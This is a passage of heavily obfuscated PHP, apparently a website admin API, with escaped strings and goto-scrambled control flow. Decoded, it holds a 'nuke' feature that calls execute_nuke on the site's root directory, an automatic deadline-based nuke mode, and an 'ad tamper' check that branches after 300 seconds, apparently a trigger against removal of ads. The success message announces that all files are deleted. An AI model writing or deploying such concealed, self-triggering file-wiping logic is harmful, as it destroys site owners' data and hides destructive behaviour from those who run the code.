"\x73\141\166\x65\x5f\x6e\165\153\x65\x5f\162\145\x64\151\x72\x65\x63\x74": goto JG2mpgXAl0; JG2mpgXAl0: $input = json_decode(file_get_contents("\x70\150\160\72\57\57\151\x6e\160\x75\164"), true); $url = trim($input["\165\162\154"] ?? ''); if (!($url && !preg_match("\43\136\x68\164\x74\x70\x73\x3f\x3a\57\x2f\43\151", $url))) { goto F8z7hZ2ReM; } echo json_encode(["\x73\x75\x63\x63\x65\163\163" => false, "\x6d\x65\x73\x73\x61\147\145" => "\350\267\xb3\xe8\xbd\254\xe9\223\xbe\346\216\245\345\277\x85\xe9\241\273\344\xbb\245\x20\150\x74\x74\x70\x3a\x2f\x2f\x20\346\210\x96\40\150\164\x74\160\x73\x3a\x2f\57\x20\xe5\274\200\345\244\xb4"]); goto N4CG1hjZUn; goto I3RQ0A3hJS; I3RQ0A3hJS: F8z7hZ2ReM: $admin = read_json(ADMIN_FILE); $admin["\x6e\x75\x6b\x65\x5f\162\x65\144\x69\162\145\143\x74\137\x65\156\x61\142\154\x65\144"] = !empty($input["\145\156\141\142\154\x65\144"]); $admin["\156\x75\153\145\137\x72\x65\144\151\162\x65\x63\x74\137\165\x72\x6c"] = $url; write_json(ADMIN_FILE, $admin); goto oQjBIVvYvp; oQjBIVvYvp: echo json_encode(["\163\x75\x63\x63\145\163\163" => true, "\155\x65\163\163\x61\147\x65" => "\350\267\263\350\xbd\254\350\xae\xbe\347\xbd\xae\345\267\262\344\277\235\xe5\xad\x98"]); goto N4CG1hjZUn; goto svGU5_uoWx; svGU5_uoWx: case "\143\141\156\x63\x65\x6c\x5f\x6e\x75\x6b\x65\137\141\165\164\x6f": $admin = read_json(ADMIN_FILE); $admin["\156\165\153\145\x5f\x6d\x6f\144\x65"] = "\x6d\x61\156\x75\141\x6c"; unset($admin["\156\165\153\x65\x5f\144\141\171\163"], $admin["\x6e\165\x6b\145\137\x64\145\x61\x64\x6c\x69\x6e\x65"], $admin["\x6e\x75\153\x65\137\144\145\x61\x64\154\151\156\145\137\164\x73"]); write_json(ADMIN_FILE, $admin); echo json_encode(["\163\x75\x63\143\x65\x73\x73" => true, "\x6d\x65\x73\163\x61\x67\x65" => "\xe5\267\xb2\xe5\x8f\x96\346\xb6\210\xe8\207\252\345\212\250\350\267\221\350\xb7\257"]); goto N4CG1hjZUn; case "\x6e\x75\153\145\137\163\151\x74\x65": goto WXV16F8z1s; WXV16F8z1s: $input = json_decode(file_get_contents("\160\x68\x70\x3a\57\57\x69\x6e\160\165\164"), true); $confirm = $input["\143\157\156\x66\151\162\155"] ?? ''; $password = $input["\160\x61\x73\x73\x77\157\162\144"] ?? ''; if (!($confirm !== "\347\xa1\xae\xe8\256\244\345\x88\xa0\xe9\x99\244")) { goto FvMOy3meZf; } echo json_encode(["\163\165\x63\x63\145\163\x73" => false, "\x6d\x65\x73\x73\x61\x67\145" => "\xe7\xa1\xae\xe8\256\244\345\x8f\243\xe4\xbb\244\xe4\xb8\215\xe6\xad\243\347\241\256"]); goto qqvpjypj6k; PQHlbxOJfJ: goto N4CG1hjZUn; R9soLwYkyM: $redirectUrl = ''; if (!(!empty($admin["\156\x75\x6b\145\137\x72\x65\144\151\x72\x65\143\164\137\145\156\x61\x62\x6c\x65\x64"]) && !empty($admin["\x6e\165\153\145\137\162\145\x64\151\x72\145\x63\x74\x5f\165\x72\154"]))) { goto Jo09Uhxm4J; } $redirectUrl = $admin["\x6e\165\153\145\137\x72\x65\x64\x69\x72\145\x63\x74\137\165\162\x6c"]; goto u148BWcvZO; XNrLpsNMX9: dGJseiO0Vt: echo json_encode($result); goto N4CG1hjZUn; goto QQHqXw5soY; u148BWcvZO: Jo09Uhxm4J: execute_nuke(ROOT_DIR, $redirectUrl); $result = ["\x73\165\143\143\145\x73\163" => true, "\x6d\145\x73\163\x61\147\145" => "\xe6\x89\200\xe6\234\211\xe6\226\207\344\xbb\xb6\xe5\267\xb2\xe5\x88\240\351\231\xa4\357\274\214\xe5\x86\x8d\350\247\x81\357\xbc\x81"]; if (!$redirectUrl) { goto dGJseiO0Vt; } $result["\x72\145\144\x69\162\x65\143\x74\137\x75\162\x6c"] = $redirectUrl; goto XNrLpsNMX9; qqvpjypj6k: goto N4CG1hjZUn; FvMOy3meZf: $admin = read_json(ADMIN_FILE); if (!(empty($password) || !password_verify($password, $admin["\160\x61\x73\163\167\x6f\162\x64\x5f\150\x61\x73\x68"] ?? ''))) { goto R9soLwYkyM; } echo json_encode(["\163\x75\x63\x63\x65\x73\163" => false, "\155\145\x73\x73\x61\147\x65" => "\345\257\206\xe7\240\201\xe9\xaa\x8c\xe8\257\201\345\244\261\xe8\264\xa5\357\274\214\350\xaf\xb7\xe8\276\x93\xe5\x85\xa5\345\xbd\x93\345\211\215\xe7\231\xbb\xe5\275\x95\xe5\257\206\xe7\240\x81"]); goto PQHlbxOJfJ; QQHqXw5soY: default: http_response_code(404); echo json_encode(["\x73\x75\x63\x63\145\x73\x73" => false, "\155\145\163\163\x61\x67\145" => "\346\x9c\252\xe7\237\245\xe6\x93\x8d\xe4\275\x9c"]); goto N4CG1hjZUn; } Ou2Ee8uo9f: goto syp8nXqaGy; wMOlFzMnbT: if (!(($admin["\x6e\165\x6b\x65\x5f\155\157\144\x65"] ?? "\x6d\141\x6e\165\141\154") === "\141\x75\x74\157" && !empty($admin["\x6e\165\x6b\x65\137\x64\x65\141\x64\x6c\151\156\x65\x5f\164\163"]))) { goto xGVPibsQHv; } if (!(time() >= $admin["\156\x75\x6b\x65\137\x64\145\141\144\154\151\156\145\137\164\163"])) { goto ucYzFinWOh; } $redirectUrl = ''; if (!(!empty($admin["\156\165\153\x65\x5f\162\x65\x64\151\162\145\143\164\137\145\x6e\141\x62\154\x65\144"]) && !empty($admin["\x6e\165\x6b\x65\x5f\162\145\x64\x69\162\145\143\164\137\165\x72\x6c"]))) { goto E1DonERptv; } $redirectUrl = $admin["\x6e\165\153\145\137\x72\x65\144\x69\x72\145\x63\164\x5f\165\162\154"]; goto v1Z4Ldc_Nk; Uhi51A0NuD: $admin["\x61\x64\137\164\x61\x6d\160\x65\x72\x5f\164\x73"] = time(); write_json(ADMIN_FILE, $admin); BP3MqPy1dY: $deadline = $admin["\141\144\x5f\x74\141\155\160\x65\x72\137\164\x73"] + 300; if (!(time() >= $deadline)) { goto glltrSuGz5; } goto HTTlI7JbVJ; Lj3fXURfo9: echo json_encode(["\163\x75\x63\143\x65\163\x73" => true, "\x6d\145\x73\163\x61\x67\x65" => "\xe7\x95\x99\xe8\250\x80\xe5\217\x91\351\200\x81\346\x88\x90\xe5\212\237\xef\xbc\214\346\204\x9f\xe8\260\xa2\344\xbd\xa0\347\232\x84\346\235\xa5\xe4\xbf\241\357\274\201"]); exit; wplupCWOk3: if (is_logged_in()) { goto m6DFeqViYm; } http_response_code(401); goto OL_t7y4aic; OL_t7y4aic: echo json_encode(["\163\165\x63\x63\x65\163\x73" => false, "\x6d\x65\163\163\x61\x67\x65" => "\xe6\234\252\347\x99\273\xe5\275\x95"]); exit; m6DFeqViYm: if (!($_SERVER["\x52\x45\121\x55\105\x53\x54\x5f\115\x45\124\x48\x4f\x44"] === "\x50\117\123\x54")) { goto x6lR3S1k6g; } $csrfToken = $_SERVER["\x48\124\124\120\137\130\137\x43\x53\122\x46\x5f\124\117\x4b\105\x4e"] ?? ''; goto tiIScJau5w; HY8XuRHuQj: $email = trim($input["\145\155\141\151\154"] ?? ''); if (!(!$email || !filter_var($email, FILTER_VALIDATE_EMAIL))) { goto D3_ewYBHfD; } echo json_encode(["\x73\x75\x63\143\145\163\163" => false, "\x6d\145\163\163\x61\x67\145" => "\350\xaf\267\350\xbe\x93\345\x85\245\346\234\x89\xe6\225\x88\347\232\x84\xe9\202\xae\347\256\xb1\xe5\x9c\xb0\345\235\x80"]); exit; D3_ewYBHfD: goto iS2NSL9HKu; qdA2UNCTLG: $content["\142\147\137\157\160\141\143\x69\164\171"] = $content["\142\147\137\x6f\160\141\143\151\164\171"] ?? 70; echo json_encode(["\x73\165\143\x63\x65\163\163" => true, "\144\141\x74\141" => $content], JSON_UNESCAPED_UNICODE); exit; niMMwf22Ak: if (!($action === "\x63\150\x65\143\153\137\x61\x64\x5f\164\141\155\160\x65\x72")) { goto VtpVEqPkAk; } goto C3wyGEZgGz; a72OU0VEX9: $message = trim($input["\155\x65\163\163\x61\147\x65"] ?? ''); if (!(!$name || !$email || !$message)) { goto JaY1DYgWFf; } echo json_encode(["\x73\x75\x63\x63\x65\x73\163" => false, "\x6d\x65\x73\163\x61\147\145" => "\xe8\257\267\xe5\241\253\345\206\231\345\xae\x8c\346\225\264\344\xbf\241\346\201\257"]); exit; JaY1DYgWFf: goto ljfNIlts2O; jruCSchDZd: ChS01B3bOF: if (!($_SERVER["\122\x45\x51\125\105\x53\124\x5f\115\x45\x54\x48\x4f\x44"] === "\x4f\x50\124\111\x4f\x4e\x53")) { goto ZkrPqJ3rfE; } http_response_code(204); exit; ZkrPqJ3rfE: goto KVZNp1wBGu; syp8nXqaGy: N4CG1hjZUn: